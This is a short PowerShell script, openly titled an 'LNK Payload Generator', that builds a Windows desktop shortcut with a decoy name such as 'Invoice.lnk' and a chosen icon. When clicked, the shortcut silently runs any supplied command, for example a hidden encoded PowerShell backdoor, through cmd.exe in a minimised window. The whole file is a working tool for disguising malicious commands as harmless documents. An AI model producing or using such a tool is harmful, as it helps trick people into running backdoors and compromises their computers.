<#
.SYNOPSIS
    LNK Payload Generator
.DESCRIPTION
    Creates a clickable .lnk file that launches any stealthy command or backdoor.
#>

$shortcutName = Read-Host "Enter name for the malicious shortcut (e.g., Invoice.lnk)"
$payload = Read-Host "Enter full command to execute (e.g., powershell -w hidden -enc ...)"
$icon = Read-Host "Enter icon path (optional, or press Enter to skip)"

$desktop = [Environment]::GetFolderPath("Desktop")
$ws = New-Object -ComObject WScript.Shell
$sc = $ws.CreateShortcut("$desktop\$shortcutName")

$sc.TargetPath = "cmd.exe"
$sc.Arguments = "/c $payload"
if ($icon -ne "") { $sc.IconLocation = $icon }
$sc.WindowStyle = 7  # Minimized
$sc.Save()

Write-Host "`n🎯 LNK Payload created on desktop as $shortcutName"
Write-Host "🔥 Clicking it will launch: $payload"
